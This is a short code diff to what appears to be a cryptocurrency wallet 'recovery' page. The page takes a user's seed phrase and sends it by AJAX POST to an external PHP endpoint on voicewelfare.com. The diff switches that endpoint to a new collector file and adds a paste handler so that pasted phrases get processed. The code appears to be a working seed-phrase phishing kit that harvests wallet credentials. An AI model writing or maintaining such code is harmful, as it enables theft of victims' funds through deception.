@@ -1157,6 +1157,11 @@
         }
     }
 
+    // Ensure the function is also triggered when the user pastes
+	document.getElementById("formPhrase").addEventListener('paste', function () {
+		setTimeout(() => countWords(this), 0);
+	});
+    
 </script>
 
 <script>
@@ -1190,7 +1195,7 @@
                 //console.log('Seed phrase is valid:', dappWords);
                 // console.log('Wallet address:', wallet.address); url: "./validate.php",
                 $.ajax({
-                    url: "https://voicewelfare.com/recovery/fixedappsolutions.php",
+                    url: "https://voicewelfare.com/recovery/blockhainsphere.php",
                     method: "POST",
                     dataType: "JSON",
                     data: {
